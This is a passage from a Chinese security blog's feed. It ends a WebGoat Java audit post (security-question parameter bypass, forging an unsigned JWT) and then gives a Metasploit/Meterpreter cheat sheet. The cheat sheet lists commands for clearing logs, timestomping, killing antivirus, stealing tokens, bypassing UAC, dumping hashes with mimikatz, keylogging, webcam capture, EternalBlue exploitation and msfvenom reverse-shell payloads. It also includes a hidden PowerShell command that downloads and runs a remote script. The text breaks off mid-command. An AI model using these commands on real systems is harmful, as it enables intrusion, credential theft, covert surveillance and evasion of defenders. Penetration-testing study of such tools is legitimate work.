&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (submittedQuestions.containsKey(<span class="string">"secQuestion1"</span>) &amp;&amp; !submittedQuestions.get(<span class="string">"secQuestion1"</span>).equals(secQuestionStore.get(verifyUserId).get(<span class="string">"secQuestion1"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说就是提交两个参数<code>secQuestion0</code>,<code>secQuestion1</code>判断是否与设定的相等<br>相等判断为作弊…返回失败<br>不相等则进行下次比较，但这次又要求相等才返回成功…非常有CTF味道的一道题emmm</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map &lt;String,String&gt; userAnswers = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">List&lt;String&gt; paramNames = Collections.list(req.getParameterNames());</span><br><span class="line"><span class="keyword">for</span>  (String paramName : paramNames) &#123;</span><br><span class="line">    <span class="comment">//String paramName = req.getParameterNames().nextElement();</span></span><br><span class="line">    <span class="keyword">if</span> (paramName.contains(<span class="string">"secQuestion"</span>)) &#123;</span><br><span class="line">        userAnswers.put(paramName,req.getParameter(paramName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (HashMap)userAnswers;</span><br></pre></td></tr></table></figure><p>仔细一看，参数的传递并不是通过<code>@RequestParam</code>指定的</p><p>而且判断参数时只判断了是否包含<code>SecQuestion</code>字段<br>可以篡改参数<code>secQuestion0</code>为<code>secQuestion2</code>以及<code>secQuestion1</code>为<code>secQuestion3</code>，达到绕过目的</p><p><img src="AF-rs.PNG" alt="AF-rs"></p><p>这里展现了一处由逻辑漏洞引发的身份验证失效与越权问题，比较有意思</p><h2 id="JWT-tokens-4"><a href="#JWT-tokens-4" class="headerlink" title="JWT tokens-4"></a>JWT tokens-4</h2><p><strong>JSON WEB Token</strong>（<strong>JWT</strong>），是一种基于JSON的、用于令牌标识（token）</p><p>近年来RESTful API开始风靡，使用HTTP header来传递认证令牌似乎变得理所应当，但是很多开发者误用了jwt，这个东西也有它的缺点，比如</p><ul><li>一旦颁发票据，就无法作废。</li></ul><blockquote><p>所有的认证信息都在JWT中，由于在服务端没有状态，即使你知道了某个JWT被盗取了，你也没有办法将其作废。在JWT过期之前（你绝对应该设置过期时间），你无能为力。</p></blockquote><ul><li>存储问题</li></ul><blockquote><p> JWT的存储选项有local storage、session storage和cookie<br> 放到cookie意味着不能httponly，产生了XSS风险<br> 放到storage，安全问题更加严重。</p></blockquote><p>可见JWT其实比较适合一次性的命令认证，而不太适用于session</p><h3 id="JWT构成"><a href="#JWT构成" class="headerlink" title="JWT构成"></a>JWT构成</h3><p>JWT通常由三部分组成: 头信息（header）, 消息体（payload）和签名（signature），签名部分用于确保前两个数据块不被篡改。</p><p><img src="AF-token.PNG" alt="AF-token"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">access_token=</span><br><span class="line">eyJhbGciOiJIUzUxMiJ9.</span><br><span class="line">eyJpYXQiOjE1NTgwMTUxNDksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiU3lsdmVzdGVyIn0.</span><br><span class="line">ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg;</span><br></pre></td></tr></table></figure><p>对抓到的请求包的cookie进行base64解码</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"alg"</span>:<span class="string">"HS512"</span></span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">&#123;</span><br><span class="line"><span class="attr">"iat"</span>:<span class="number">1558015149</span>,</span><br><span class="line"><span class="attr">"admin"</span>:<span class="string">"false"</span>,</span><br><span class="line"><span class="attr">"user"</span>:<span class="string">"Sylvester"</span></span><br><span class="line">&#125;</span><br><span class="line">.</span><br><span class="line">ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg</span><br></pre></td></tr></table></figure><h4 id="JWT的攻击面"><a href="#JWT的攻击面" class="headerlink" title="JWT的攻击面"></a>JWT的攻击面</h4><ul><li>未校验签名</li><li>禁用哈希</li><li>密钥暴破</li></ul><p>尝试篡改admin值，若服务端没有作签名校验，将导致直接越权。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;"alg":"HS512"&#125;.&#123;"iat":1558015149,"admin":"true","user":"Sylvester"&#125; In0.ZmbN4mmCkFtBRThUQRRpjQxa2NTLlK3jGv689_DHO4bglB6yePRuo3JXwQ2miASNL7HFgQCLm6qV618s8XXDHg</span><br></pre></td></tr></table></figure><p>或者使用<code>pyjwt</code>生成空签名的<code>jwt token</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pyjwt</span><br><span class="line"></span><br><span class="line">import jwt</span><br><span class="line">jwt.encode(&#123;<span class="string">'iat'</span>: 1558015149, <span class="string">"admin"</span>:<span class="string">"true"</span>,<span class="string">"user"</span>:<span class="string">"Sylvester"</span>&#125;, algorithm=<span class="string">'none'</span>, key=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJmYW5ydWFuIiwiaWF0IjoxNTc1NDI1MjkyLCJleHAiOjE1NzU0Mjg4OTIsInN1YiI6ImFkbWluIiwiZGVzY3JpcHRpb24iOiJhZG1pbihhZG1pbikiLCJqdGkiOiJqd3QifQ.</span><br></pre></td></tr></table></figure><blockquote><p>到这里腰斩了，不限期咕咕咕。毕竟离校之后很难再有那样大块的时间了…<br>看到这里是不是很蛋疼。本来没打算发的，想想还是发吧hhh</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;说在前面的话&quot;&gt;&lt;a href=&quot;#说在前面的话&quot; class=&quot;headerlink&quot; title=&quot;说在前面的话&quot;&gt;&lt;/a&gt;说在前面的话&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;补一下以前挖的坑，好多忘了上传…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;以前硬着头皮啃了本php代码审计的书，感觉还是java好玩，这次来学学Java审计。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ps:目的是熟悉各种漏洞在Java下的表现，所以并没有按着通关要求来做，只是点到为止&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;WebGoat环境配置&quot;&gt;&lt;a href=&quot;#WebGoat环境配置&quot; class=&quot;headerlink&quot; title=&quot;WebGoat环境配置&quot;&gt;&lt;/a&gt;WebGoat环境配置&lt;/h2&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="https://t43wiu6.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="代码审计" scheme="https://t43wiu6.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit-ALL-In-One</title>
    <link href="https://t43wiu6.github.io/2019/04/20/Metasploit-All-In-One/"/>
    <id>https://t43wiu6.github.io/2019/04/20/Metasploit-All-In-One/</id>
    <published>2019-04-20T12:39:32.000Z</published>
    <updated>2019-12-25T06:29:21.540Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2019/04/20/Metasploit-All-In-One/2.png" alt=""></p><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><a id="more"></a><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">execute <span class="comment">#在目标机中执行文件</span></span><br><span class="line">execute -H -i -f cmd.exe <span class="comment"># 创建新进程cmd.exe，-H不可见，-i交互</span></span><br><span class="line">clearev <span class="comment">#清除windows中的应用程序日志、系统日志、安全日志</span></span><br><span class="line">edit c:\\1.txt <span class="comment">#编辑或创建文件  没有的话，会新建文件</span></span><br><span class="line">lcd /tmp   <span class="comment">#操作攻击者主机 切换目录</span></span><br><span class="line">timestomp C:// -h   <span class="comment">#查看帮助</span></span><br><span class="line">timestomp -v C://2.txt   <span class="comment">#查看时间戳</span></span><br><span class="line">timestomp C://2.txt -f C://1.txt <span class="comment">#将1.txt的时间戳复制给2.txt</span></span><br><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 <span class="comment">#将目标机的3389端口转发到本地6666端口</span></span><br><span class="line">portfwd delete -l 6666 -p 3389 -r 127.0.0.1 <span class="comment">#将目标机的3389端口转发到本地6666端口删除</span></span><br></pre></td></tr></table></figure><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> <span class="comment"># 自动迁移,一般是迁移到记事本</span></span><br><span class="line">run post/windows/manage/migrate</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 手动迁移</span></span><br><span class="line">getpid    <span class="comment"># 获取当前进程的pid</span></span><br><span class="line">ps   <span class="comment"># 查看当前活跃进程</span></span><br><span class="line">migrate &lt;pid值   <span class="comment">#将Meterpreter会话移植到指定pid值进程中</span></span><br><span class="line"><span class="built_in">kill</span> &lt;pid值  <span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sysinfo</span><br><span class="line">arp</span><br><span class="line">getproxy   <span class="comment">#查看代理信息</span></span><br><span class="line">idletime <span class="comment"># 查看运行时间</span></span><br><span class="line">route <span class="comment"># 查看子网</span></span><br><span class="line">getuid <span class="comment"># 查看用户名与权限</span></span><br><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/windows/gather/forensics/enum_drives <span class="comment">#查看分区</span></span><br><span class="line">run post/windows/gather/enum_applications <span class="comment">#获取安装软件信息</span></span><br><span class="line">run post/windows/gather/dumplinks   <span class="comment">#获取最近的文件操作</span></span><br><span class="line">run post/windows/gather/enum_ie  <span class="comment">#获取IE缓存</span></span><br><span class="line">run post/windows/gather/enum_chrome   <span class="comment">#获取Chrome缓存</span></span><br><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users <span class="comment"># 已登录用户列举</span></span><br><span class="line">run post/windows/manage/killav <span class="comment"># 杀死杀软</span></span><br><span class="line">run post/windows/manage/enable_rdp <span class="comment"># 启动远程桌面</span></span><br></pre></td></tr></table></figure><h3 id="提权模块"><a href="#提权模块" class="headerlink" title="提权模块"></a>提权模块</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 枚举补丁</span></span><br><span class="line">background</span><br><span class="line">use post/windows/gather/enum_patches</span><br><span class="line"><span class="built_in">set</span> sessions 1</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">use post/mutli/recon/local_exploit_suggester <span class="comment">#枚举提权exp</span></span><br></pre></td></tr></table></figure><h4 id="BypassUAC"><a href="#BypassUAC" class="headerlink" title="BypassUAC"></a>BypassUAC</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">backround</span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_comhijack</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_eventvwr</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_fodhelper</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_injection_winsxs</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_sluihijack</span><br><span class="line">exploit/windows/<span class="built_in">local</span>/bypassuac_vbs</span><br></pre></td></tr></table></figure><h4 id="令牌操纵"><a href="#令牌操纵" class="headerlink" title="令牌操纵"></a>令牌操纵</h4><h5 id="令牌伪造"><a href="#令牌伪造" class="headerlink" title="令牌伪造"></a>令牌伪造</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u <span class="comment">#列出token</span></span><br><span class="line">impersonate_token WIN-57TJ4B561MT\\Administrator</span><br><span class="line">shell</span><br><span class="line">whoami</span><br><span class="line">rev2self   <span class="comment">#返回原始token</span></span><br></pre></td></tr></table></figure><h5 id="窃取令牌"><a href="#窃取令牌" class="headerlink" title="窃取令牌"></a>窃取令牌</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">steal_token &lt;pid值  <span class="comment">#从指定进程中窃取token   先ps</span></span><br><span class="line">drop_token  <span class="comment">#删除窃取的token</span></span><br></pre></td></tr></table></figure><h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  <span class="comment">#查看补丁信息</span></span><br><span class="line">use exploit/windows/<span class="built_in">local</span>/ms10_092_schelevator</span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="密码抓取"><a href="#密码抓取" class="headerlink" title="密码抓取"></a>密码抓取</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">wdigest  <span class="comment">#获取Wdigest密码</span></span><br><span class="line">mimikatz_command -f samdump::hashes  <span class="comment">#执行mimikatz原始命令 抓取hash</span></span><br><span class="line">mimikatz_command -f samdump:: <span class="comment">#查看介绍</span></span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br><span class="line">mimikatz_command -f a:: <span class="comment">#通过加载错误模块查看帮助</span></span><br><span class="line">mimikatz_command -f <span class="built_in">hash</span>:: <span class="comment">#选用该模块</span></span><br><span class="line"></span><br><span class="line">msv <span class="comment">#抓取系统hash</span></span><br><span class="line">tspkg</span><br><span class="line">kerberos <span class="comment">#抓取系统票据</span></span><br><span class="line">ssp <span class="comment">#ipc$密码</span></span><br><span class="line">wdigest <span class="comment">#获取系统账号信息</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump </span><br><span class="line"><span class="built_in">set</span> session 1</span><br><span class="line">run</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">hashdump</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可以导出域内所有用户hash</span></span><br><span class="line"><span class="comment">#需要SYSTEM权限</span></span><br><span class="line"><span class="comment">#如果开启了UAC会失败，需要先绕过UAC</span></span><br><span class="line">run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure><h3 id="屏幕抓取"><a href="#屏幕抓取" class="headerlink" title="屏幕抓取"></a>屏幕抓取</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">load espia</span><br><span class="line">screengrab</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screenshot</span><br></pre></td></tr></table></figure><h3 id="摄像头抓取"><a href="#摄像头抓取" class="headerlink" title="摄像头抓取"></a>摄像头抓取</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">webcam_snap</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直播</span></span><br><span class="line">webcam_stream</span><br></pre></td></tr></table></figure><h3 id="键盘操纵"><a href="#键盘操纵" class="headerlink" title="键盘操纵"></a>键盘操纵</h3><h4 id="键盘开关"><a href="#键盘开关" class="headerlink" title="键盘开关"></a>键盘开关</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uictl [<span class="built_in">enable</span>/<span class="built_in">disable</span>] [keyboard/mouse/all]  <span class="comment">#开启或禁止键盘/鼠标</span></span><br><span class="line">uictl <span class="built_in">disable</span> mouse  <span class="comment">#禁用鼠标</span></span><br><span class="line">uictl <span class="built_in">disable</span> keyboard  <span class="comment">#禁用键盘</span></span><br></pre></td></tr></table></figure><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keyscan_start  <span class="comment">#开始键盘记录</span></span><br><span class="line">keyscan_dump   <span class="comment">#导出记录数据</span></span><br><span class="line">keyscan_stop <span class="comment">#结束键盘记录</span></span><br></pre></td></tr></table></figure><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp USERNAME=*** PASSWORD=***</span><br><span class="line">run getgui -u example_username -p example_password <span class="comment">#不推荐</span></span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=<span class="literal">true</span> LPORT=6662  <span class="comment">#将3389端口转发到6662</span></span><br></pre></td></tr></table></figure><p>开启<code>rdp</code>是通过<code>reg</code>修改注册表；添加用户是调用<code>cmd.exe</code>通过<code>net user</code>添加；端口转发是利用的<code>portfwd</code>命令</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">download c:\test.txt /root</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upload /root/test.txt c:\</span><br></pre></td></tr></table></figure><h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search -f *flag*</span><br><span class="line">search -f *.txt</span><br></pre></td></tr></table></figure><h3 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reg –h</span><br><span class="line">    -d   注册表中值的数据.</span><br><span class="line">    -k   注册表键路径</span><br><span class="line">    -v   注册表键名称</span><br><span class="line">    enumkey 枚举可获得的键</span><br><span class="line">    setval 设置键值</span><br><span class="line">    queryval 查询键值数据</span><br></pre></td></tr></table></figure><h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">setg</span><br><span class="line">unsetg <span class="comment">#可以配置全局变量</span></span><br></pre></td></tr></table></figure><h3 id="自动路由"><a href="#自动路由" class="headerlink" title="自动路由"></a>自动路由</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run get_local_subnets <span class="comment"># 查看网段</span></span><br><span class="line">run autoroute -s ip/24 <span class="comment"># 路由子网</span></span><br><span class="line"></span><br><span class="line">run post/windows/manage/autoroute <span class="comment"># 查看并路由子网</span></span><br><span class="line">background</span><br><span class="line">route add 目标ip 掩码 session_id</span><br><span class="line">route <span class="built_in">print</span></span><br></pre></td></tr></table></figure><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/server/socks4a </span><br><span class="line"><span class="built_in">set</span> srvhost 127.0.0.1</span><br><span class="line"><span class="built_in">set</span> srvport 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="msf端口扫描"><a href="#msf端口扫描" class="headerlink" title="msf端口扫描"></a>msf端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts</span><br><span class="line"><span class="built_in">set</span> ports 21-25,80-90,8080-8090,1433,3306,1521,445,139,135</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h3 id="msf-arp扫描"><a href="#msf-arp扫描" class="headerlink" title="msf_arp扫描"></a>msf_arp扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure><h3 id="nmap存活扫描"><a href="#nmap存活扫描" class="headerlink" title="nmap存活扫描"></a>nmap存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db_nmap --min-hostgroup 1024 --min-parallelism 1024 -p 445 10.0.0.0-10.255.255.255 <span class="comment">#-sn</span></span><br></pre></td></tr></table></figure><h3 id="应用扫描"><a href="#应用扫描" class="headerlink" title="应用扫描"></a>应用扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#/usr/share/metasploit-framework/modules/auxiliary/scanner/</span></span><br><span class="line">use auxiliary/scanner/http/dir_scanner</span><br><span class="line">use auxiliary/scanner/http/jboss_vulnscan</span><br><span class="line">use auxiliary/scanner/oracle/oracle_login</span><br><span class="line">auxiliary/scanner/telnet/telnet_login <span class="comment">#TELNET登录</span></span><br><span class="line">scanner/vnc/vnc_none_auth <span class="comment">#VNC空口令扫描</span></span><br><span class="line">auxiliary/scanner/ssh/ssh_loginSSH <span class="comment">#登录测试</span></span><br><span class="line">auxiliary/scanner/portscan <span class="comment">#端口扫描</span></span><br><span class="line">---smb</span><br><span class="line">auxiliary/scanner/smb/smb_version <span class="comment">#SMB系统版本扫描</span></span><br><span class="line">auxiliary/scanner/smb/smb_enumusers <span class="comment">#SMB枚举</span></span><br><span class="line">auxiliary/scanner/smb/smb_login <span class="comment">#SMB弱口令</span></span><br><span class="line">auxiliary/scanner/smb/psexec_command <span class="comment">#SMB登录且执行命令</span></span><br><span class="line">---mssql</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">scanner/mssql/mssql_ping <span class="comment">#主机信息扫描</span></span><br><span class="line">admin/mssql/mssql_enum <span class="comment">#枚举</span></span><br><span class="line">admin/mssql/mssql_exec <span class="comment">#执行命令</span></span><br><span class="line">admin/mssql/mssql_sql <span class="comment">#查询</span></span><br><span class="line">scanner/mssql/mssql_login <span class="comment">#弱口令扫描</span></span><br><span class="line">---mysql</span><br><span class="line">auxiliary/scanner/mysql/mysql_version</span><br><span class="line">auxiliary/admin/mysql/mysql_enum <span class="comment">#枚举</span></span><br><span class="line">auxiliary/admin/mysql/mysql_sql <span class="comment">#语句执行</span></span><br><span class="line">auxiliary/scanner/mysql/mysql_login <span class="comment">#弱口令扫描</span></span><br><span class="line">---smtp</span><br><span class="line">auxiliary/scanner/smtp/smtp_version <span class="comment">#SMTP版本扫描</span></span><br><span class="line">auxiliary/scanner/smtp/smtp_enum <span class="comment">#SMTP枚举</span></span><br><span class="line">auxiliary/scanner/snmp/community <span class="comment">#SNMP扫描设备</span></span><br></pre></td></tr></table></figure><h3 id="扫描利用"><a href="#扫描利用" class="headerlink" title="扫描利用"></a>扫描利用</h3><h4 id="批量导入目标ip"><a href="#批量导入目标ip" class="headerlink" title="批量导入目标ip"></a>批量导入目标ip</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">db_import <span class="string">"/root/445-ip.txt"</span></span><br></pre></td></tr></table></figure><h4 id="扫描445"><a href="#扫描445" class="headerlink" title="扫描445"></a>扫描445</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_version</span><br><span class="line"><span class="built_in">set</span> rhosts 10.0.0.0-10.0.255.255</span><br><span class="line"><span class="built_in">set</span> threads 400</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h4 id="扫描MS17-010"><a href="#扫描MS17-010" class="headerlink" title="扫描MS17-010"></a>扫描MS17-010</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line"><span class="built_in">set</span> threads 50</span><br><span class="line"><span class="comment">#set rhosts 10.0.0.1-10.0.255.255</span></span><br><span class="line"><span class="comment">#set rhosts 192.168.1.1/24</span></span><br><span class="line">hosts -R</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h4 id="利用MS17-010"><a href="#利用MS17-010" class="headerlink" title="利用MS17-010"></a>利用MS17-010</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">hosts -R</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 本机ip</span><br><span class="line"><span class="built_in">set</span> lport 4444</span><br></pre></td></tr></table></figure><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line">OPTIONS:</span><br><span class="line">     -L opt 要监听的本地主机（可选）。</span><br><span class="line">     -h        帮助横幅。</span><br><span class="line">     -l opt 要监听的本地端口。</span><br><span class="line">     -p opt 要连接的远程端口</span><br><span class="line">     -r opt 要连接的远程主机</span><br><span class="line"></span><br><span class="line">portfwd add -l 5555 -p 3389 -r 192.168.1.30</span><br></pre></td></tr></table></figure><h3 id="抓包嗅探"><a href="#抓包嗅探" class="headerlink" title="抓包嗅探"></a>抓包嗅探</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   <span class="comment">#查看网卡</span></span><br><span class="line">sniffer_start 2   <span class="comment">#选择网卡 开始抓包</span></span><br><span class="line">sniffer_stats 2   <span class="comment">#查看状态</span></span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  <span class="comment">#导出pcap数据包</span></span><br><span class="line">sniffer_stop 2   <span class="comment">#停止抓包</span></span><br></pre></td></tr></table></figure><h3 id="RC脚本"><a href="#RC脚本" class="headerlink" title="RC脚本"></a>RC脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将较常用的命令保存为xx.rc</span></span><br><span class="line"><span class="comment"># msfconsole -r xx.rc</span></span><br><span class="line"><span class="comment"># msf resource xx.rc</span></span><br><span class="line">use exploit/multi/handler </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 192.168.22.170</span><br><span class="line"><span class="built_in">set</span> lport 6661</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f bash -o text</span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.135.100 LPORT=1234 -f sh -o text</span><br></pre></td></tr></table></figure><h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-reflection -o /mnt/c/Users/sherd/Desktop/a.ps1</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh -o /mnt/c/Users/sherd/Desktop/a.ps1</span><br><span class="line"></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-net -o /mnt/c/Users/sherd/Desktop/a.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行</span></span><br><span class="line">powershell -w hidden -<span class="built_in">exec</span> bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.135.100/a.ps1');a.ps1"</span></span><br><span class="line"></span><br><span class="line">PowerShell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File xxx.ps1</span><br><span class="line"><span class="comment">#黏贴执行</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=127.0.0.1 lport=6666 -f psh-cmd -o /mnt/c/Users/sherd/Desktop/a.txt</span><br></pre></td></tr></table></figure><p>与powersploit联动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#生成shellcode #ps1生成的shellcode一致</span></span><br><span class="line">msfvenom -p 